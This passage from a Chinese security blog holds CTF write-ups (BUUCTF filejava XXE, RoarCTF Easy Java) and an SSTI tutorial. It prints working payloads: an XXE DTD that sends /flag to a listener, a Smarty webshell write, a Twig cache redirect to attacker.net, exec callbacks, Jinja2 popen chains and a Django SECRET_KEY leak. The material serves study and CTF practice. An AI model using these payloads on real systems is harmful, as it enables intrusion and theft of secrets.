class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>自己写了好久都没成功跑出来，也懒得再改了，直接参考大佬的exp</p><h2 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h2><p>java web项目目录：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">webapps    # 含Web应用的程序(JSP、Servlet和JavaBean等)</span><br><span class="line">webapps/META-INF/#存放一些meta information相关的文件</span><br><span class="line">webapps/WEB-INF/classes/    #用于存放java字节码文件</span><br><span class="line">webapps/WEB-INF/lib/    #用于存放该工程用到的库，例如servlet-api.jar等等</span><br><span class="line">webapps/WEB-INF/web.xml    #web工程的配置文件，完成用户请求的逻辑名称到真正的servlet类的映射</span><br></pre></td></tr></table></figure><h3 id="writeup-1"><a href="#writeup-1" class="headerlink" title="writeup"></a>writeup</h3><p>查看源码发现提示flag在<code>/flag</code>,浏览发现可以上传文件，第一时间想到上传jsp webshell，但是不知道路径，上传完之后发现可以下载，这里就存在个任意文件下载</p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200510231429.png" style="zoom:80%;"><p>试着去读<code>WEB-INF/web.xml</code></p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200510231631.png" style="zoom:80%;"><p>根据这个包的路径去下载<code>.class</code>文件，由于这个是字节码文件，我们需要反编译一下，发现</p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200510234936.png" style="zoom:80%;"><p>利用EXCEL进行XXE攻击：<a href="https://xz.aliyun.com/t/3741">https://xz.aliyun.com/t/3741</a></p><p>我们就可以xxe了，如下构造：</p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200510235326.png" style="zoom:67%;"><p>vps上的test.dtd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1:9001?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>最后上传以类似于<code>excel-1.xlsx</code>的名字上传，就能收到flag了</p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200510235915.png" style="zoom:80%;"><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><h3 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup"></a>writeup</h3><p>这题相对于前一题就比较简单了</p><p>打开是一个登陆页面，暴力破解发现密码是<code>admin888</code>，登陆进去提示flag不在这</p><p>登陆页面有个help，打开提示<code>java.io.FileNotFoundException</code>，猜测应该是读文件的</p><p>直接访问<code>/help.docx</code>，发现可以把文件下载下来，猜测可以任意文件下载，但GET不能，不清楚为啥</p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200515154314.png" style="zoom:80%;"><p>读下<code>WEB-INF/web.xml</code> ，看到</p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200515154514.png" style="zoom:80%;"><p>读下源码<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200515154752.png" style="zoom:80%;"><p>base64解密就能得到flag，也可以反编译一下看下代码</p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIM截图20200515155046.png" style="zoom:80%;">]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI模板注入漏洞</title>
      <link href="2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了服务端模板注入漏洞及其利用方式！</p><a id="more"></a><h2 id="什么是模板注入？"><a href="#什么是模板注入？" class="headerlink" title="什么是模板注入？"></a>什么是模板注入？</h2><p>服务端模板注入(SSTI)，全称Server-Side Template Injection，与我们熟知的SQL注入、命令注入等原理大同小异，当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑。</p><h2 id="常见的模板引擎"><a href="#常见的模板引擎" class="headerlink" title="常见的模板引擎"></a>常见的模板引擎</h2><p><strong>各框架模板结构：</strong></p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/t01f4792c7d03dd49cc.png" style="zoom:150%;"><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><h4 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h4><p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p><p>但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读<a href="https://github.com/smarty-php/smarty">模板的文档</a>以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法。</p><p><strong><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385">getStreamVariable()</a></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params">$variable</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $_result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $fp = fopen($variable, <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ($fp) &#123;</span><br><span class="line">        <span class="keyword">while</span> (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            $_result .= $current_line;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $_result;</span><br><span class="line">    &#125;</span><br><span class="line">    $smarty = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;smarty) ? <span class="keyword">$this</span>-&gt;smarty : <span class="keyword">$this</span>;</span><br><span class="line">    <span class="keyword">if</span> ($smarty-&gt;error_unassigned) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . $variable . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们可以用这个方法读文件，payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p><strong><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">class Smarty_Internal_Write_File</a></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smarty_Internal_Write_File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Writes file in a safe way to disk</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $_filepath complete filepath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $_contents file content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  Smarty $smarty    smarty instance</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> SmartyException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params">$_filepath, $_contents, Smarty $smarty</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $_error_reporting = error_reporting();</span><br><span class="line">        error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        <span class="keyword">if</span> ($smarty-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            $old_umask = umask(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_dirpath = dirname($_filepath);</span><br><span class="line">        <span class="comment">// if subdirs, create dir structure</span></span><br><span class="line">        <span class="keyword">if</span> ($_dirpath !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !file_exists($_dirpath)) &#123;</span><br><span class="line">            mkdir($_dirpath, $smarty-&gt;_dir_perms === <span class="literal">null</span> ? <span class="number">0777</span> : $smarty-&gt;_dir_perms, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write to tmp file, then move to overt file lock race condition</span></span><br><span class="line">        $_tmp_file = $_dirpath . DS . str_replace(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, uniqid(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">        <span class="keyword">if</span> (!file_put_contents($_tmp_file, $_contents)) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Windows&#x27; rename() fails if the destination exists,</span></span><br><span class="line"><span class="comment">         * Linux&#x27; rename() properly handles the overwrite.</span></span><br><span class="line"><span class="comment">         * Simply unlink()ing a file might cause other processes</span></span><br><span class="line"><span class="comment">         * currently reading that file to fail, but linux&#x27; rename()</span></span><br><span class="line"><span class="comment">         * seems to be smart enough to handle that for us.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (Smarty::$_IS_WINDOWS) &#123;</span><br><span class="line">            <span class="comment">// remove original file</span></span><br><span class="line">            <span class="keyword">if</span> (is_file($_filepath)) &#123;</span><br><span class="line">                @unlink($_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            <span class="keyword">if</span> (!$success) &#123;</span><br><span class="line">                <span class="comment">// remove original file</span></span><br><span class="line">                <span class="keyword">if</span> (is_file($_filepath)) &#123;</span><br><span class="line">                    @unlink($_filepath);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// rename tmp file</span></span><br><span class="line">                $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$success) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_filepath&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($smarty-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// set file permissions</span></span><br><span class="line">            chmod($_filepath, $smarty-&gt;_file_perms);</span><br><span class="line">            umask($old_umask);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting($_error_reporting);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>writeFile</code>函数第三个参数一个 <code>Smarty</code> 类型，后来找到了 <code>self::clearConfig()</code>，函数原型：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearConfig</span>(<span class="params">$varname = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Smarty_Internal_Extension_Config::clearConfig(<span class="keyword">$this</span>, $varname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们可以构造payload写个webshell:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,<span class="string">&quot;&lt;?php eval(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::clearConfig())&#125;</span><br></pre></td></tr></table></figure><h4 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h4><p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 <code>self::</code> 调用静态变量了，但是 通过<a href="https://twig.symfony.com/doc/2.x/templates.html">官方文档</a>的查询：Twig 给我们提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但是却有一个 env。</p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Twig_env.png" style="zoom:67%;"><p>env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置(不知道为什么官方文档没有看到这个方法，后来找到了Twig 的源码中的 environment.php）</p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Twig_setCache.png" style="zoom:67%;"><p>因此，明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞：</p><p><strong>payload:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>但是新的问题出现了</strong>，<code>allow_url_include</code> 一般是不打开的，没法包含远程文件，没关系还有个调用过滤器的函数 <a href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p><p>这个函数中调用了一个 <code>call_user_function</code> 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        [snip]</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;filterCallbacks <span class="keyword">as</span> $callback) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> !== $filter = call_user_func($callback, $name)) &#123;<span class="comment">//注意这行</span></span><br><span class="line">            <span class="keyword">return</span> $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerUndefinedFilterCallback</span>(<span class="params">$callable</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filterCallbacks[] = $callable;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>我们只要把exec() 作为回调函数传进去就能实现命令执行了</p><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><h4 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">request, *args, **kwargs</span>):</span></span><br><span class="line">    template = <span class="string">&#x27;Hello &#123;user&#125;, This is your email: &#x27;</span> + request.GET.get(<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure><p>注入点很明显就是 email，但是如果我们的能力已经被限制的很死，很难执行命令，但又想获取和 User 有关的配置信息的话，怎么办？</p><p>可以发现我们现在拿到的只有有一个 和user 有关的变量，那就是 request user ，那我们的思路是什么？</p><p>p牛在自己的博客中分享了这个思路，我把它引用过来：</p><blockquote><p>Django是一个庞大的框架，其数据库关系错综复杂，我们其实是可以通过属性之间的关系去一点点挖掘敏感信息。但Django仅仅是一个框架，在没有目标源码的情况下很难去挖掘信息，所以我的思路就是：去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项</p></blockquote><p>什么意思，简单地说就是我们在没有应用源码的情况下要学会去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用，然后一步一步的靠近我们的目标</p><p>后来发现Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/django-seetings.png" style="zoom:80%;"><p>所以，思路就很明确了：我们只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?email&#x3D;&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line"></span><br><span class="line">?email&#x3D;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure><h4 id="Flask-jinja2"><a href="#Flask-jinja2" class="headerlink" title="Flask/jinja2"></a>Flask/jinja2</h4><p>Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2</p><p>举个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&#x27;/hello-template-injection&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_ssti</span>():</span></span><br><span class="line">    person = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;world&quot;</span>, <span class="string">&#x27;secret&#x27;</span>:<span class="string">&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person[<span class="string">&#x27;name&#x27;</span>] = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;&#x27;&#x27;</span> % person[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, person=person)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user_file</span>(<span class="params">f_name</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(f_name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.readlines()</span><br><span class="line">    </span><br><span class="line">app.jinja_env.globals[<span class="string">&#x27;get_user_file&#x27;</span>] = get_user_file</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>我们就可以SSTI将secret泄露出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello-template-injection?name&#x3D;MoonBack.&#123;&#123;person.secret&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/TIM截图20200216182714.png" style="zoom:80%;"><p>同样我们可以用<code>get_user_file</code>读取文件</p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/TIM截图20200216182934.png" style="zoom:80%;"><p>假设我们用下面的payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;ipconfig&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>我们就可以成功执行命令</p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/TIM截图20200223174026.png" style="zoom:80%;"><p>而漏洞点就存在于：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">template = <span class="string">&#x27;&#x27;&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;&#x27;&#x27;</span> % person[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"><span class="keyword">return</span> render_template_string(template, person=person)</span><br></pre></td></tr></table></figure><p>如果改成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&#x27;/hello-template-injection&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_ssti</span>():</span></span><br><span class="line">    person = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;world&quot;</span>, <span class="string">&#x27;secret&#x27;</span>:<span class="string">&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person[<span class="string">&#x27;name&#x27;</span>] = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">  